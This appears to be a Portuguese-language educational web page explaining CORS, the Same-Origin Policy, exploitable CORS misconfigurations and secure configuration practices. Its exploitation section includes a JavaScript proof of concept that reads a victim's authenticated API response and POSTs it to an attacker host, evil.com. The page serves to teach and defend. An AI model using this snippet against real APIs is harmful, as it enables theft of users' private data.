@@ -1,0 +1,196 @@
+﻿<!DOCTYPE html>
+<html lang="pt-br">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+  <meta name="color-scheme" content="dark light" />
+  <meta name="description" content="CORS — Cross-Origin Resource Sharing: Same-Origin Policy, headers CORS, misconfigurações exploráveis e como configurar corretamente." />
+  <link rel="preload" href="/css/base.css" as="style" fetchpriority="high" />
+  <link rel="stylesheet" href="/css/base.css" />
+  <link rel="icon" href="/imagens/favicon/favicon.png" type="image/png">
+  <link rel="apple-touch-icon" href="/imagens/favicon/favicon.png">
+  <link rel="preload" href="/js/main.js" as="script">
+  <script src="/js/main.js" defer></script>
+  <title>CORS — Cross-Origin Resource Sharing | Site Guia</title>
+</head>
+
+<body>
+  <div class="nav-overlay"></div>
+  <div class="nav-interno-overlay"></div>
+  <button class="menu-toggle" title="Abrir/fechar navegação">
+    <span class="menu-icon">☰</span><span class="close-icon">&ltimes;</span>
+  </button>
+  <button class="menu-interno-toggle" title="Abrir/fechar menu interno">
+    <span class="menu-icon">☰</span><span class="close-icon">&rtimes;</span>
+  </button>
+  <div data-include="/html/Site/partials/header.html"></div>
+
+  <main class="main-content">
+    <div class="content-area">
+
+      <div class="Colored_border_anim_card_box">
+        <p><strong>CORS — Cross-Origin Resource Sharing</strong></p>
+      </div>
+
+      <section>
+        <h2 id="sop" class="section-title">Same-Origin Policy (SOP)</h2>
+
+        <div class="page-header">
+          <div class="logo logo--lg page-icon" role="img" aria-label="Dragão do Site Guia"></div>
+          <h1>CORS — Cross-Origin Resource Sharing</h1>
+          <p>Same-Origin Policy e as excessões controladas que o CORS permite configurar.</p>
+        </div>
+
+        <p class="intro-highlight">A Same-Origin Policy é a regra fundamental de segurança dos browsers: um script em <span class="code-inline">app.com</span> não pode ler respostas de requisições feitas a <span class="code-inline">api.outro.com</span>. Origens são idênticas se compartilham <strong>protocolo + host + porta</strong>. CORS é o mecanismo que permite exceções controladas a essa regra.</p>
+        <div class="section-divider"></div>
+
+        <div class="scroll-x">
+          <table>
+            <thead>
+              <tr><th>URL A</th><th>URL B</th><th>Mesma Origem?</th><th>Razão</th></tr>
+            </thead>
+            <tbody>
+              <tr><td><span class="code-inline">https://app.com/a</span></td><td><span class="code-inline">https://app.com/b</span></td><td><span data-svg="correto" aria-hidden="true"></span> Sim</td><td>Protocolo, host e porta iguais</td></tr>
+              <tr><td><span class="code-inline">https://app.com</span></td><td><span class="code-inline">http://app.com</span></td><td><span data-svg="errado" aria-hidden="true"></span> Não</td><td>Protocolo diferente</td></tr>
+              <tr><td><span class="code-inline">https://app.com</span></td><td><span class="code-inline">https://sub.app.com</span></td><td><span data-svg="errado" aria-hidden="true"></span> Não</td><td>Host diferente (subdomínio)</td></tr>
+              <tr><td><span class="code-inline">https://app.com:443</span></td><td><span class="code-inline">https://app.com:8443</span></td><td><span data-svg="errado" aria-hidden="true"></span> Não</td><td>Porta diferente</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </section>
+
+      <section>
+        <h2 id="headers" class="section-title">Headers CORS</h2>
+        <div class="section-divider"></div>
+
+        <pre class="code-block">
+# Requisição cross-origin (browser envia automaticamente):
+GET /api/dados HTTP/1.1
+Host: api.exemplo.com
+Origin: https://app.exemplo.com
+
+# Resposta do servidor (configuração correta):
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://app.exemplo.com   ← origem específica
+Access-Control-Allow-Credentials: true                  ← permite cookies
+Access-Control-Allow-Methods: GET, POST, PUT
+Access-Control-Allow-Headers: Content-Type, Authorization
+
+# Para requests com metodos não-simples (PUT, DELETE, custom headers):
+# Browser envia preflight (OPTIONS) antes:
+OPTIONS /api/dados HTTP/1.1
+Origin: https://app.exemplo.com
+Access-Control-Request-Method: DELETE
+Access-Control-Request-Headers: Authorization</pre>
+      </section>
+
+      <section>
+        <h2 id="misc" class="section-title">Misconfigurações Exploráveis</h2>
+        <div class="section-divider"></div>
+
+        <div class="grid-cards">
+          <div class="card card--danger">
+            <h3 class="text--danger">Wildcard + Credentials</h3>
+            <pre class="code-block" style="font-size:0.8rem">
+# INVÁLIDO pelo padrão CORS (browsers rejeitam):
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true
+# * não pode ser combinado com credentials
+# Mas servidores podem aceitar erroneamente e vazar dados</pre>
+          </div>
+          <div class="card card--danger">
+            <h3 class="text--danger">Reflexão do Origin sem validação</h3>
+            <pre class="code-block" style="font-size:0.8rem">
+# Servidor copia automaticamente o Origin da requisição:
+# Requisição: Origin: https://evil.com
+# Resposta: Access-Control-Allow-Origin: https://evil.com
+# + Access-Control-Allow-Credentials: true
+# → Atacante lê resposta autenticada da vítima!</pre>
+          </div>
+          <div class="card card--danger">
+            <h3 class="text--danger">Regex bypass de Origin</h3>
+            <pre class="code-block" style="font-size:0.8rem">
+# Regex falho permite domínios não esperados:
+# Padrão: /^https:\/\/.*\.exemplo\.com$/
+# Bypass: https://evil.exemplo.com  ← subdomínio controlado
+# Bypass: https://exemploXcom       ← sem escaped dot</pre>
+          </div>
+          <div class="card card--danger">
+            <h3 class="text--danger">Null Origin</h3>
+            <pre class="code-block" style="font-size:0.8rem">
+# Origin: null é enviado por:
+# - iframes sandboxed
+# - arquivos locais (file://)
+# Servidor que aceita null:
+Access-Control-Allow-Origin: null
+# Atacante usa iframe sandboxed para fazer requisição
+# com Origin: null e ler a resposta</pre>
+          </div>
+        </div>
+      </section>
+
+      <section>
+        <h2 id="exploit" class="section-title">Exploração de CORS Vulnerável</h2>
+        <div class="section-divider"></div>
+
+        <pre class="code-block">
+// Atacante hospeda em evil.com — vítima visita a página:
+&lt;script&gt;
+fetch('https://api.alvo.com/dados-sensiveis', {
+  credentials: 'include'  // envia cookies da vítima
+})
+.then(r =&gt; r.text())
+.then(data =&gt; {
+  // Exfiltra resposta (dados da vítima) para o servidor do atacante
+  fetch('https://evil.com/exfiltrate', {
+    method: 'POST',
+    body: data
+  });
+});
+&lt;/script&gt;
+
+// Para funcionar:
+// 1. O servidor precisa ter Access-Control-Allow-Origin refletindo evil.com
+// 2. Access-Control-Allow-Credentials: true precisa estar presente</pre>
+      </section>
+
+      <section>
+        <h2 id="config-correta" class="section-title">Configuração Segura</h2>
+        <div class="section-divider"></div>
+
+        <div class="grid-cards">
+          <div class="panel">
+            <p class="panel-title">Whitelist explícita de origens</p>
+            <p>Mantenha uma lista de origens permitidas e valide exatamente. Nunca use regex sem cuidado — prefira comparação exata string por string.</p>
+          </div>
+          <div class="panel">
+            <p class="panel-title">Evitar wildcard com dados sensíveis</p>
+            <p><span class="code-inline">Access-Control-Allow-Origin: *</span> é aceitável para APIs públicas sem autenticação (ex: CDN). Nunca combine com <span class="code-inline">Allow-Credentials: true</span>.</p>
+          </div>
+          <div class="panel">
+            <p class="panel-title">Vary: Origin</p>
+            <p>Se o servidor reflete o Origin, deve incluir <span class="code-inline">Vary: Origin</span> para que intermediários (CDN/proxy) não cacheiem incorretamente respostas para origens diferentes.</p>
+          </div>
+          <div class="panel">
+            <p class="panel-title">Não confundir CORS com autenticação</p>
+            <p>CORS é uma política do browser — não autentica o servidor. Servidores devem validar tokens de autorização independentemente de qualquer configuração CORS.</p>
+          </div>
+        </div>
+      </section>
+
+      <div class="callout">
+        <p>CORS mal configurado é um achado frequente em bug bounty, especialmente em APIs internas expostas acidentalmente. Teste enviando origens falsas e verificando se o servidor reflete. Ferramentas como Burp Suite facilitam essa análise. Lembre-se: CORS protege o client-side reading de respostas — a requisição em si sempre chega ao servidor.</p>
+        <p class="frase-destaque">
+          <span data-svg="estrela" aria-hidden="true"></span>
+          "CORS é um mecanismo de relaxamento da Same-Origin Policy — configure com precisão cirúrgica."
+        </p>
+      </div>
+
+    </div>
+  </main>
+
+  <div data-include="/html/Site/partials/footer.html"></div>
+</body>
+
+</html>
